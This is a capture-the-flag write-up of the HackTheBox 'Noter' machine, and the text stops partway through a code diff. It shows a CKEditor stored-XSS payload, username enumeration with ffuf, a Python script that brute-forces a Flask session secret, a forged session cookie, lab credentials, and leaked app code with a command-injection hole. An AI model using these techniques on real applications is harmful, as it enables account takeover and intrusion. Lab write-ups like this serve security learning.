I"‚s<style>
.time {
    text-align: center;
    margin-top: 30px;
    font-family: 'Open Sans', sans-serif;
    font-weight: 300;
    font-style: normal;
}
</style>

<p class="time">04 Sep 2022 | Reading time: ~15 min</p>

<h1 align="center">HackTheBox - Noter [Medium] </h1>

<p class="time" style="font-size: 75%;">

#CKEditor,

#Linux,

#MySQL,

#MySQL-privesc,

#RCE,

#UDF-privesc,

#authentication-bypass,

#code-review,

#command-injection,

#flask,

#flask-session-cookie-bruteforce,

#hardcoded-credentials,

#insecure-credentials,

#md-to-pdf,

#python-coding,

#user-enumeration

</p>

<p><img src="/assets/images/Screenshots/Noter/Noter.png" alt="box-summary.jpg" /></p>

<hr />

<h2 class="no_toc text-delta" id="table-of-contents">Table of contents</h2>

<ol id="markdown-toc">
  <li><a href="#resolution-summary" id="markdown-toc-resolution-summary">Resolution summary</a>    <ol>
      <li><a href="#improved-skills" id="markdown-toc-improved-skills">Improved skills</a></li>
      <li><a href="#used-tools" id="markdown-toc-used-tools">Used tools</a></li>
    </ol>
  </li>
  <li><a href="#information-gathering" id="markdown-toc-information-gathering">Information Gathering</a></li>
  <li><a href="#enumeration" id="markdown-toc-enumeration">Enumeration</a>    <ol>
      <li><a href="#port-21---ftp-vsftpd-303" id="markdown-toc-port-21---ftp-vsftpd-303">Port 21 - FTP (vsftpd 3.0.3)</a></li>
      <li><a href="#port-5000---http-werkzeug-httpd-202-python-3810" id="markdown-toc-port-5000---http-werkzeug-httpd-202-python-3810">Port 5000 - HTTP (Werkzeug httpd 2.0.2 (Python 3.8.10))</a>        <ol>
          <li><a href="#stored-xss-vulnerability-cve-2021-33829" id="markdown-toc-stored-xss-vulnerability-cve-2021-33829">Stored XSS vulnerability (CVE-2021-33829):</a></li>
          <li><a href="#user-enumeration" id="markdown-toc-user-enumeration">User Enumeration</a></li>
        </ol>
      </li>
    </ol>
  </li>
  <li><a href="#exploitation" id="markdown-toc-exploitation">Exploitation</a>    <ol>
      <li><a href="#brute-forcing-secret-key-used-to-generate-cookies" id="markdown-toc-brute-forcing-secret-key-used-to-generate-cookies">Brute-forcing secret key used to generate cookies:</a>        <ol>
          <li><a href="#enumerate-secret-notes" id="markdown-toc-enumerate-secret-notes">Enumerate secret notes</a></li>
          <li><a href="#accessed-ftp-using-leaked-credentials" id="markdown-toc-accessed-ftp-using-leaked-credentials">Accessed FTP using leaked credentials</a></li>
        </ol>
      </li>
      <li><a href="#arbitrary-code-injection" id="markdown-toc-arbitrary-code-injection">Arbitrary Code Injection</a></li>
    </ol>
  </li>
  <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a>    <ol>
      <li><a href="#local-enumeration" id="markdown-toc-local-enumeration">Local enumeration</a></li>
      <li><a href="#mysql-4x50-linux---user-defined-function-udf-dynamic-library-2" id="markdown-toc-mysql-4x50-linux---user-defined-function-udf-dynamic-library-2">MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)</a></li>
    </ol>
  </li>
  <li><a href="#trophy" id="markdown-toc-trophy">Trophy</a></li>
</ol>
<hr />

<h1 id="resolution-summary">Resolution summary</h1>

<ul>
  <li>The web application used different error messages when trying to login with existing users, allowing to <strong>enumerate usernames</strong> and discover <strong>blue</strong>.</li>
  <li>The session cookie provided to authenticated users was <strong>signed using a weak secret</strong>. It was possible to <strong>bruteforce</strong> it and <strong>sign arbitrary cookie</strong>, impersonating any existing user (blue)</li>
  <li>Enumerating <strong>blueâ€™s  notes</strong> it was possible to discover <strong>its credentials</strong> and access <strong>FTP</strong>. Inside its notes it was also possible to discover the <strong>ftp_admin</strong> user</li>
  <li>Inside FTP a documents containing password policy was discovered and it was possible to <strong>guess ftp_admin credentials.</strong> Accessing FTP as ftp_admin it was possible to discover <strong>two backups of the web application</strong>.</li>
  <li><strong>Code review</strong> allowed to identify some <strong>command injection vulnerabilities</strong> contained within the <code class="language-plaintext highlighter-rouge">/export_note_remote</code> and <code class="language-plaintext highlighter-rouge">/export_note_local/&lt;string:id&gt;</code>, allowing to execute arbitrary commands and obtain a shell as <strong>svc</strong></li>
  <li>Using <strong>hardcoded credentials</strong> from the backup files it was possible to access MySQL with high privileges and exploit <strong>User-Defined Function</strong> (UDF) <strong>Dynamic Library</strong> to elevate privileges to root</li>
</ul>

<h2 id="improved-skills">Improved skills</h2>

<ul>
  <li>Bruteforce weak signed cookie in order to sign custom ones</li>
  <li>Review application code to find command injection vulnerabilities</li>
  <li>Exploit UDF Dynamic Library to elevate privileges</li>
</ul>

<h2 id="used-tools">Used tools</h2>

<ul>
  <li>nmap</li>
  <li>gobuster</li>
  <li>ffuf</li>
  <li>custom python code</li>
  <li>ftp</li>
  <li>diff</li>
  <li>public exploit</li>
</ul>

<hr />

<h1 id="information-gathering">Information Gathering</h1>

<p>Scanned all TCP ports:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Noter]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> 10.129.58.132 <span class="nt">-v</span> <span class="nt">-oN</span> scan/all-tcp-ports.txt
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali:
...
Nmap scan report <span class="k">for </span>10.129.58.132
Host is up <span class="o">(</span>0.042s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.26 seconds
           Raw packets sent: 65675 <span class="o">(</span>2.890MB<span class="o">)</span> | Rcvd: 65539 <span class="o">(</span>2.622MB<span class="o">)</span>
</code></pre></div></div>

<p>Enumerated open TCP ports:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Noter]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,22,5000 <span class="nt">-oN</span> scan/open-tcp-ports.txt 10.129.58.132
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-08 08:53 EDT
Nmap scan report <span class="k">for </span>10.129.58.132
Host is up <span class="o">(</span>0.038s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d <span class="o">(</span>RSA<span class="o">)</span>
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 <span class="o">(</span>ED25519<span class="o">)</span>
5000/tcp open  http    Werkzeug httpd 2.0.2 <span class="o">(</span>Python 3.8.10<span class="o">)</span>
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>10.87 seconds
</code></pre></div></div>

<p>Enumerated top 200 UDP ports:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Noter]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">--top-ports</span> 200 10.129.58.132
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-08 08:55 EDT
Nmap scan report <span class="k">for </span>10.129.58.132
Host is up <span class="o">(</span>0.038s latency<span class="o">)</span><span class="nb">.</span>
All 200 scanned ports on 10.129.58.132 are <span class="k">in </span>ignored states.
Not shown: 159 closed udp ports <span class="o">(</span>port-unreach<span class="o">)</span>, 41 open|filtered udp ports <span class="o">(</span>no-response<span class="o">)</span>

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>164.86 seconds
</code></pre></div></div>

<h1 id="enumeration">Enumeration</h1>

<h2 id="port-21---ftp-vsftpd-303">Port 21 - FTP (vsftpd 3.0.3)</h2>

<p>No anonymous access</p>

<h2 id="port-5000---http-werkzeug-httpd-202-python-3810">Port 5000 - HTTP (Werkzeug httpd 2.0.2 (Python 3.8.10))</h2>

<p>Browsed port 5000:</p>

<p><img src="/assets/images/Screenshots/Noter/Untitled.png" alt="Untitled" /></p>

<p>Registered a new user:</p>

<aside>
ðŸ”‘ 0xbro     password

</aside>

<p><img src="/assets/images/Screenshots/Noter/Untitled%201.png" alt="Untitled" /></p>

<p>Enumerated VIP function:</p>

<p><img src="/assets/images/Screenshots/Noter/Untitled%202.png" alt="Untitled" /></p>

<p>Enumerated software version:</p>

<p><img src="/assets/images/Screenshots/Noter/Untitled%203.png" alt="CKEditor 4.6.2" /></p>

<p>CKEditor 4.6.2</p>

<h3 id="stored-xss-vulnerability-cve-2021-33829">Stored XSS vulnerability (CVE-2021-33829):</h3>

<p><a href="https://checkmarx.com/blog/cve-2021-33829-stored-xss-vulnerability-discovered-in-ckeditor4-affects-widely-used-cms/">CVE-2021-33829: Stored XSS Vulnerability Discovered in CKEditor4 Affects Widely-Used CMS</a></p>

<p><code class="language-plaintext highlighter-rouge">Xss&lt;!--{cke_protected} --!&gt;&lt;img src=1 onerror=alert(</code>XSS<code class="language-plaintext highlighter-rouge">)&gt;--&gt;Attack</code></p>

<h3 id="user-enumeration">User Enumeration</h3>

<p>Existing user:</p>

<p><img src="/assets/images/Screenshots/Noter/Untitled%204.png" alt="Untitled" /></p>

<p>Non existing user:</p>

<p><img src="/assets/images/Screenshots/Noter/Untitled%205.png" alt="Untitled" /></p>

<p>Enumerated existing users:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[/usr/share/wordlists/seclists]
â””â”€<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Usernames/cirt-default-usernames.txt  <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"username=FUZZ&amp;password=xxx"</span> <span class="nt">-u</span> http://noter.htb:5000/login <span class="nt">-H</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span> <span class="nt">-mr</span> <span class="s2">"Invalid login"</span>                    2 â¨¯

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : POST
 :: URL              : http://noter.htb:5000/login
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/cirt-default-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&amp;password=xxx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Invalid login
________________________________________________

maoutis                 [Status: 200, Size: 2028, Words: 432, Lines: 69]
blue                    [Status: 200, Size: 2025, Words: 432, Lines: 69]
:: Progress: [829/829] :: Job [1/1] :: 365 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
</span></code></pre></div></div>

<h1 id="exploitation">Exploitation</h1>

<h2 id="brute-forcing-secret-key-used-to-generate-cookies">Brute-forcing secret key used to generate cookies:</h2>

<ul>
  <li><a href="https://pypi.org/project/flask-cookie-decode/">flask-cookie-decode</a></li>
  <li><a href="https://github.com/noraj/flask-session-cookie-manager/tree/d1b17a66850eeeb710c63da762631d38ee3c8dda">GitHub - noraj/flask-session-cookie-manager at d1b17a66850eeeb710c63da762631d38ee3c8dda</a></li>
</ul>

<p><strong>bruteforce.py</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
# standard imports
</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">zlib</span>
<span class="kn">from</span> <span class="nn">itsdangerous</span> <span class="kn">import</span> <span class="n">base64_decode</span>
<span class="kn">import</span> <span class="nn">ast</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">from</span> <span class="nn">abc</span> <span class="kn">import</span> <span class="n">ABC</span><span class="p">,</span> <span class="n">abstractmethod</span>

<span class="c1"># Lib for argument parsing
</span><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">itertools</span>

<span class="c1"># external Imports
</span><span class="kn">from</span> <span class="nn">flask.sessions</span> <span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>

<span class="k">class</span> <span class="nc">MockApp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">secret_key</span>

<span class="k">class</span> <span class="nc">FSCM</span><span class="p">(</span><span class="n">ABC</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">session_cookie_value</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">):</span>
        <span class="s">""" Decode a Flask cookie  """</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">app</span> <span class="o">=</span> <span class="n">MockApp</span><span class="p">(</span><span class="n">secret_key</span><span class="p">)</span>
            <span class="n">si</span> <span class="o">=</span> <span class="n">SecureCookieSessionInterface</span><span class="p">()</span>
            <span class="n">s</span> <span class="o">=</span> <span class="n">si</span><span class="p">.</span><span class="n">get_signing_serializer</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">session_cookie_value</span><span class="p">))</span>
            <span class="nb">exit</span><span class="p">()</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="s">"[Decoding error] {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
            <span class="k">raise</span> <span class="n">e</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: bruteforce.py &lt;cookie&gt; &lt;wordlist&gt;"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

    <span class="n">cookie</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">wordlist</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">secret_key</span> <span class="o">=</span> <span class="s">''</span>

    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Bruteforcing cookie </span><span class="si">{</span><span class="n">cookie</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">w</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Testig secret_key </span><span class="si">{</span><span class="n">w</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">FSCM</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">w</span><span class="p">))</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/exploit]
â””â”€<span class="nv">$ </span>python3 bruteforce.py <span class="s2">"eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFvdXRpcyJ9.YnzZWg.ywsr97WH9bxrZEwndwUEVuHDiWU"</span> /usr/share/wordlists/rockyou.txt

Bruteforcing cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFvdXRpcyJ9.YnzZWg.ywsr97WH9bxrZEwndwUEVuHDiWU
Testig secret_key 123456
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
Testig secret_key 12345
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
Testig secret_key 123456789
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
Testig secret_key password
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
...
<span class="o">[</span>Decoding error] Signature b<span class="s1">'ywsr97WH9bxrZEwndwUEVuHDiWU'</span> does not match
Testig secret_key secret123
<span class="o">{</span><span class="s1">'logged_in'</span>: True, <span class="s1">'username'</span>: <span class="s1">'maoutis'</span><span class="o">}</span>
</code></pre></div></div>

<p>Crafting an arbitrary cookie to impersonate <em>blue</em>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/Noter/exploit/flask-session-cookie-manager]
â””â”€<span class="nv">$ </span>python3 flask_session_cookie_manager3.py encode  <span class="nt">-s</span> <span class="s1">'secret123'</span> <span class="nt">-t</span> <span class="s2">"{'logged_in': True, 'username': 'blue'}"</span>
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Ynz37Q.bhsuepbK0pIPjT4j091foqoNesw
</code></pre></div></div>
<p>New features for VIP users:</p>

<p><img src="/assets/images/Screenshots/Noter/Untitled%206.png" alt="New features for VIP users" /></p>

<p>Blue notes:</p>

<p><img src="/assets/images/Screenshots/Noter/Untitled%207.png" alt="blue notes" /></p>

<h3 id="enumerate-secret-notes">Enumerate secret notes</h3>

<p><img src="/assets/images/Screenshots/Noter/Untitled%208.png" alt="Untitled" /></p>

<aside>
ðŸ”‘ blue     blue@Noter!

</aside>

<p><img src="/assets/images/Screenshots/Noter/Untitled%209.png" alt="Untitled" /></p>

<h3 id="accessed-ftp-using-leaked-credentials">Accessed FTP using leaked credentials</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/Noter/exploit/flask-session-cookie-manager]
â””â”€<span class="nv">$ </span>ftp noter.htb
Connected to noter.htb.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>noter.htb:maoutis<span class="o">)</span>: blue
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">dir
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
<span class="nt">-rw-r--r--</span>    1 1002     1002        12569 Dec 24 20:59 policy.pdf
226 Directory send OK.
ftp&gt; get policy.pdf
</code></pre></div></div>

<p><strong>policy.pdf</strong></p>

<p><img src="/assets/images/Screenshots/Noter/Untitled%2010.png" alt="Untitled" /></p>

<ul>
  <li>
    <p>Tried to access SSH using noter credentials (not working)</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/loot]
  â””â”€<span class="nv">$ </span>ssh blue@noter.htb
  blue@noter.htb<span class="s1">'s password:
  Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
    
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
    
   System information disabled due to load higher than 2.0
    
   * Super-optimized for small spaces - read how we shrank the memory
     footprint of MicroK8s to make it the smallest full K8s around.
    
     https://ubuntu.com/blog/microk8s-memory-optimisation
    
  157 updates can be applied immediately.
  112 of these updates are standard security updates.
  To see these additional updates run: apt list --upgradable
    
  The list of available updates is more than a week old.
  To check for new updates run: sudo apt update
    
  The programs included with the Ubuntu system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.
    
  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
  applicable law.
    
  The programs included with the Ubuntu system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.
    
  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
  applicable law.
    
  This account is currently not available.
  Connection to noter.htb closed.
</span></code></pre></div>    </div>
  </li>
  <li>
    <p>Tried to access FTP guessing ftp_admin credentials</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/loot]
  â””â”€<span class="nv">$ </span>ftp noter.htb
  Connected to noter.htb.
  220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
  Name <span class="o">(</span>noter.htb:maoutis<span class="o">)</span>: ftp_admin
  331 Please specify the password.
  Password:
  230 Login successful.
  Remote system <span class="nb">type </span>is UNIX.
  Using binary mode to transfer files.
  ftp&gt; <span class="nb">ls
  </span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
  150 Here comes the directory listing.
  <span class="nt">-rw-r--r--</span>    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
  <span class="nt">-rw-r--r--</span>    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
  226 Directory send OK.
  ftp&gt; get app_backup_1635803546.zip
  <span class="nb">local</span>: app_backup_1635803546.zip remote: app_backup_1635803546.zip
  200 PORT <span class="nb">command </span>successful. Consider using PASV.
  150 Opening BINARY mode data connection <span class="k">for </span>app_backup_1635803546.zip <span class="o">(</span>25559 bytes<span class="o">)</span><span class="nb">.</span>
  226 Transfer complete.
  25559 bytes received <span class="k">in </span>0.04 secs <span class="o">(</span>667.0219 kB/s<span class="o">)</span>
  ftp&gt; get app_backup_1638395546.zip
  <span class="nb">local</span>: app_backup_1638395546.zip remote: app_backup_1638395546.zip
  200 PORT <span class="nb">command </span>successful. Consider using PASV.
  150 Opening BINARY mode data connection <span class="k">for </span>app_backup_1638395546.zip <span class="o">(</span>26298 bytes<span class="o">)</span><span class="nb">.</span>
  226 Transfer complete.
  26298 bytes received <span class="k">in </span>0.04 secs <span class="o">(</span>697.8327 kB/s<span class="o">)</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>Enumerated differences between the two zip files:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/loot]
  â””â”€<span class="nv">$ </span>diff app_backup_1635803546 app_backup_1638395546 <span class="nt">-q</span> <span class="nt">-r</span>
  Only <span class="k">in </span>app_backup_1635803546: app_backup_1635803546.zip
  Only <span class="k">in </span>app_backup_1638395546: app_backup_1638395546.zip
  Files app_backup_1635803546/app.py and app_backup_1638395546/app.py differ
    
  â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[~/CTF/HTB/Noter/loot]
  â””â”€<span class="nv">$ </span>diff app_backup_1635803546/app.py app_backup_1638395546/app.py <span class="nt">-y</span> <span class="nt">--suppress-common-lines</span> <span class="nt">-t</span>                                                                                                                                         1 â¨¯
  app.config[<span class="s1">'MYSQL_USER'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'root'</span>                               |  app.config[<span class="s1">'MYSQL_USER'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'DB_user'</span>
  app.config[<span class="s1">'MYSQL_PASSWORD'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'Nildogg36'</span>                      |  app.config[<span class="s1">'MYSQL_PASSWORD'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'DB_password'</span>
                                                                  <span class="o">&gt;</span>  attachment_dir <span class="o">=</span> <span class="s1">'misc/attachments/'</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>  <span class="c"># Export notes</span>
                                                                  <span class="o">&gt;</span>  @app.route<span class="o">(</span><span class="s1">'/export_note'</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s1">'GET'</span>, <span class="s1">'POST'</span><span class="o">])</span>
                                                                  <span class="o">&gt;</span>  @is_logged_in
                                                                  <span class="o">&gt;</span>  def export_note<span class="o">()</span>:
                                                                  <span class="o">&gt;</span>      <span class="k">if </span>check_VIP<span class="o">(</span>session[<span class="s1">'username'</span><span class="o">])</span>:
                                                                  <span class="o">&gt;</span>          try:
                                                                  <span class="o">&gt;</span>              cur <span class="o">=</span> mysql.connection.cursor<span class="o">()</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              <span class="c"># Get note</span>
                                                                  <span class="o">&gt;</span>              result <span class="o">=</span> cur.execute<span class="o">(</span><span class="s2">"SELECT * FROM notes WHERE aut
                                                                  &gt;
                                                                  &gt;              notes = cur.fetchall()
                                                                  &gt;
                                                                  &gt;              if result &gt; 0:
                                                                  &gt;                  return render_template('export_note.html', note
                                                                  &gt;              else:
                                                                  &gt;                  msg = 'No notes Found'
                                                                  &gt;                  return render_template('export_note.html', msg=
                                                                  &gt;              # Close connection
                                                                  &gt;              cur.close()
                                                                  &gt;
                                                                  &gt;          except Exception as e:
                                                                  &gt;              return render_template('export_note.html', error="</span>A
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>      <span class="k">else</span>:
                                                                  <span class="o">&gt;</span>          abort<span class="o">(</span>403<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>  <span class="c"># Export local</span>
                                                                  <span class="o">&gt;</span>  @app.route<span class="o">(</span><span class="s1">'/export_note_local/&lt;string:id&gt;'</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s1">'GET'</span><span class="o">])</span>
                                                                  <span class="o">&gt;</span>  @is_logged_in
                                                                  <span class="o">&gt;</span>  def export_note_local<span class="o">(</span><span class="nb">id</span><span class="o">)</span>:
                                                                  <span class="o">&gt;</span>      <span class="k">if </span>check_VIP<span class="o">(</span>session[<span class="s1">'username'</span><span class="o">])</span>:
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>          cur <span class="o">=</span> mysql.connection.cursor<span class="o">()</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>          result <span class="o">=</span> cur.execute<span class="o">(</span><span class="s2">"SELECT * FROM notes WHERE id = %s
                                                                  &gt;
                                                                  &gt;          if result &gt; 0:
                                                                  &gt;              note = cur.fetchone()
                                                                  &gt;
                                                                  &gt;              rand_int = random.randint(1,10000)
                                                                  &gt;              command = f"</span>node misc/md-to-pdf.js  <span class="s1">$'{note['</span>body<span class="s1">']
                                                                  &gt;              subprocess.run(command, shell=True, executable="/bi
                                                                  &gt;
                                                                  &gt;              return send_file(attachment_dir + str(rand_int) +'</span><span class="nb">.</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>          <span class="k">else</span>:
                                                                  <span class="o">&gt;</span>              <span class="k">return </span>render_template<span class="o">(</span><span class="s1">'dashboard.html'</span><span class="o">)</span>
                                                                  <span class="o">&gt;</span>      <span class="k">else</span>:
                                                                  <span class="o">&gt;</span>          abort<span class="o">(</span>403<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>  <span class="c"># Export remote</span>
